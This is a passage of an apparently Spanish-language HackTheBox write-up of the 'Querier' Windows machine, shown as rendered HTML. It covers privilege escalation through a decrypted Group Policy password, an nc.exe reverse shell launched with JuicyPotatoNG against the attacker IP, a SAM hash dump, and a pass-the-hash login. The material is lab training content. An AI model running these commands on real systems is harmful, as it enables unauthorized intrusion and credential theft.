-  <li>Tenemos el <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> <code class="language-plaintext highlighter-rouge">Enable</code> y podemos usar el <a href="https://github.com/antonioCoco/JuicyPotatoNG">https://github.com/antonioCoco/JuicyPotatoNG</a> para explotarlo pero no es la principal vía para escalar privilegios de la maquina.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers&gt; <span class="nb">whoami</span> /priv
-
-PRIVILEGES INFORMATION
-<span class="nt">----------------------</span>
-
-Privilege Name                Description                               State
-<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
-SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
-SeIncreaseQuotaPrivilege      Adjust memory quotas <span class="k">for </span>a process        Disabled
-SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
-SeImpersonatePrivilege        Impersonate a client after authentication Enabled
-SeCreateGlobalPrivilege       Create global objects                     Enabled
-SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set            </span>Disabled
-</code></pre></div></div>
-
-<ul>
-  <li>Lo que podemos hacer para enumerar la maquina es usar <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; curl <span class="nt">-o</span> PowerUp.ps1 10.10.15.11/PowerUp.ps1
-PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; <span class="nb">dir
-
-
-    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop
-
-
-Mode                LastWriteTime         Length Name                   
-<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                   
-<span class="nt">-a----</span>         4/5/2024   9:26 PM         600580 PowerUp.ps1            
-<span class="nt">-ar---</span>         4/5/2024   7:41 PM             34 user.txt      
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora importamos el modulo y lo ejecutamos.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; Import-Module .<span class="se">\P</span>owerUp.ps1
-PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; Invoke-AllChecks
-</code></pre></div></div>
-
-<ul>
-  <li>Después de ejecutarse nos da una contraseña para el usuario Administrador.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; Invoke-AllChecks
-
-
-Privilege   : SeImpersonatePrivilege
-Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
-TokenHandle : 780
-ProcessId   : 4268
-Name        : 4268
-Check       : Process Token Privileges
-
-ServiceName   : UsoSvc
-Path          : C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\s</span>vchost.exe <span class="nt">-k</span> netsvcs <span class="nt">-p</span>
-StartName     : LocalSystem
-AbuseFunction : Invoke-ServiceAbuse <span class="nt">-Name</span> <span class="s1">'UsoSvc'</span>
-CanRestart    : True
-Name          : UsoSvc
-Check         : Modifiable Services
-
-ModifiablePath    : C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indowsApps
-IdentityReference : QUERIER<span class="se">\m</span>ssql-svc
-Permissions       : <span class="o">{</span>WriteOwner, Delete, WriteAttributes, Synchronize...<span class="o">}</span>
-%PATH%            : C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indowsApps
-Name              : C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\M</span>icrosoft<span class="se">\W</span>indowsApps
-Check             : %PATH% .dll Hijacks
-AbuseFunction     : Write-HijackDll <span class="nt">-DllPath</span> <span class="s1">'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'</span>
-
-UnattendPath : C:<span class="se">\W</span>indows<span class="se">\P</span>anther<span class="se">\U</span>nattend.xml
-Name         : C:<span class="se">\W</span>indows<span class="se">\P</span>anther<span class="se">\U</span>nattend.xml
-Check        : Unattended Install Files
-
-Changed   : <span class="o">{</span>2019-01-28 23:12:48<span class="o">}</span>
-UserNames : <span class="o">{</span>Administrator<span class="o">}</span>
-NewName   : <span class="o">[</span>BLANK]
-Passwords : <span class="o">{</span>MyUnclesAreMarioAndLuigi!!1!<span class="o">}</span>
-File      : C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\G</span>roup
-            Policy<span class="se">\H</span>istory<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>achine<span class="se">\P</span>references<span class="se">\G</span>roups<span class="se">\G</span>roups.xml
-Check     : Cached GPP Files
-</code></pre></div></div>
-
-<ul>
-  <li>La encontró aquí.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; <span class="nb">type</span> <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\G</span><span class="s2">roup Policy</span><span class="se">\H</span><span class="s2">istory</span><span class="se">\{</span><span class="s2">31B2F340-016D-11D2-945F-00C04FB984F9}</span><span class="se">\M</span><span class="s2">achine</span><span class="se">\P</span><span class="s2">references</span><span class="se">\G</span><span class="s2">roups</span><span class="se">\G</span><span class="s2">roups.xml"</span>
-&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span> ?&gt;&lt;Groups <span class="nv">clsid</span><span class="o">=</span><span class="s2">"{3125E937-EB16-4b4c-9934-544FC6D24D26}"</span><span class="o">&gt;</span>
-&lt;User <span class="nv">clsid</span><span class="o">=</span><span class="s2">"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"Administrator"</span> <span class="nv">image</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">changed</span><span class="o">=</span><span class="s2">"2019-01-28 23:12:48"</span> <span class="nv">uid</span><span class="o">=</span><span class="s2">"{CD450F70-CDB8-4948-B908-F8D038C59B6C}"</span> <span class="nv">userContext</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">removePolicy</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">policyApplied</span><span class="o">=</span><span class="s2">"1"</span><span class="o">&gt;</span>
-&lt;Properties <span class="nv">action</span><span class="o">=</span><span class="s2">"U"</span> <span class="nv">newName</span><span class="o">=</span><span class="s2">""</span> <span class="nv">fullName</span><span class="o">=</span><span class="s2">""</span> <span class="nv">description</span><span class="o">=</span><span class="s2">""</span> <span class="nv">cpassword</span><span class="o">=</span><span class="s2">"CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ"</span> <span class="nv">changeLogon</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">noChange</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">neverExpires</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">acctDisabled</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">userName</span><span class="o">=</span><span class="s2">"Administrator"</span><span class="o">&gt;</span>&lt;/Properties&gt;&lt;/User&gt;&lt;/Groups&gt;
-PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt;
-</code></pre></div></div>
-
-<ul>
-  <li>Pero si vemos la contraseña esta encriptada y se puede desencriptar con <code class="language-plaintext highlighter-rouge">gpp-decrypt</code> aunque la herramienta ya no la dio en texto plano.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
-MyUnclesAreMarioAndLuigi!!1!
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a validar la contraseña.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.67.247 <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'MyUnclesAreMarioAndLuigi!!1!'</span> <span class="nt">--local-auth</span>
-SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:QUERIER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>+] QUERIER<span class="se">\A</span>dministrator:MyUnclesAreMarioAndLuigi!!1! <span class="o">(</span>Pwn3d!<span class="o">)</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Gracias al output que nos dan <strong>Pwn3d!</strong> ya nos podemos conectar al servicio <code class="language-plaintext highlighter-rouge">winrm</code> empleando <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.67.247 <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'MyUnclesAreMarioAndLuigi!!1!'</span>
-
-Evil-WinRM shell v3.5
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
-</span>querier<span class="se">\a</span>dministrator
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
-</code></pre></div></div>
-
-<h2 id="root-flag">root flag</h2>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
-38f63aa04664d186bccca4c48252e656
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
-</code></pre></div></div>
-
-<h2 id="explotando-el-setimpersonateprivilege">Explotando el SetImpersonatePrivilege</h2>
-
-<ul>
-  <li>
-    <p>Bueno explotar esto es muy fácil ya lo hemos echo muchas veces.</p>
-  </li>
-  <li>
-    <p>Primero necesitamos traer ala maquina el <code class="language-plaintext highlighter-rouge">netcat</code> para Windows para ganar una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; curl <span class="nt">-o</span> nc.exe 10.10.15.11/nc.exe
-PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; <span class="nb">dir
-
-
-    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop
-
-
-Mode                LastWriteTime         Length Name                   
-<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                   
-<span class="nt">-a----</span>         4/5/2024   9:39 PM          28160 nc.exe                 
-<span class="nt">-a----</span>         4/5/2024   9:26 PM         600580 PowerUp.ps1            
-<span class="nt">-ar---</span>         4/5/2024   7:41 PM             34 user.txt               
-
-
-PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; curl <span class="nt">-o</span> JuicyPotatoNG.exe 10.10.15.11/JuicyPotatoNG.exe
-PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt;
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Ahora nos ponemos en escucha con <code class="language-plaintext highlighter-rouge">rlwrap</code> con lo habíamos hecho antes.</p>
-  </li>
-  <li>
-    <p>Nos enviamos la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop&gt; .<span class="se">\J</span>uicyPotatoNG.exe <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> C:<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>md.exe <span class="nt">-a</span> <span class="s2">"/c C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\m</span><span class="s2">ssql-svc</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\n</span><span class="s2">c.exe 10.10.15.11 443 -e powershell"</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Y ahora recibimos la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
-listening on <span class="o">[</span>any] 443 ...
-connect to <span class="o">[</span>10.10.15.11] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.67.247] 49686
-Windows PowerShell
-Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.
-
-PS C:<span class="se">\&gt;</span> <span class="nb">whoami
-whoami
-</span>nt authority<span class="se">\s</span>ystem
-PS C:<span class="se">\&gt;</span>
-</code></pre></div></div>
-
-<h2 id="dumpeando-los-hashes-ntlm-almacenados-en-la-sam">Dumpeando los hashes NTLM almacenados en la SAM</h2>
-
-<ul>
-  <li>Y bueno algo extra es que como tenemos las credenciales del usuario administrador podemos <code class="language-plaintext highlighter-rouge">dumpear</code> los hashes de los demás usuario para hacer <code class="language-plaintext highlighter-rouge">pass the hash</code> y conectarnos sin proporcionar contraseña.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.67.247 <span class="nt">-u</span> Administrator <span class="nt">-p</span> <span class="s1">'MyUnclesAreMarioAndLuigi!!1!'</span> <span class="nt">--local-auth</span> <span class="nt">--sam</span>
-SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:QUERIER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>+] QUERIER<span class="se">\A</span>dministrator:MyUnclesAreMarioAndLuigi!!1! <span class="o">(</span>Pwn3d!<span class="o">)</span>
-SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>+] Dumping SAM hashes
-SMB         10.129.67.247   445    QUERIER          Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dcefe78334b42c0ce483b8e1b2886ab:::
-SMB         10.129.67.247   445    QUERIER          Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-SMB         10.129.67.247   445    QUERIER          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-SMB         10.129.67.247   445    QUERIER          WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5564df813a052fce1f477bf934863870:::
-SMB         10.129.67.247   445    QUERIER          mssql-svc:1001:aad3b435b51404eeaad3b435b51404ee:0ac7bd9745e85cbea2fe0fa11f33c588:::
-SMB         10.129.67.247   445    QUERIER          reporting:1002:aad3b435b51404eeaad3b435b51404ee:5c8c5434d1c5cfea71d25a364adcc5e8:::
-SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>+] Added 6 SAM hashes to the database
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.67.247 <span class="nt">-u</span> Administrator <span class="nt">-H</span> 2dcefe78334b42c0ce483b8e1b2886ab
-
-Evil-WinRM shell v3.5
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
-</span>querier<span class="se">\a</span>dministrator
 <span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
 </code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry></feed>
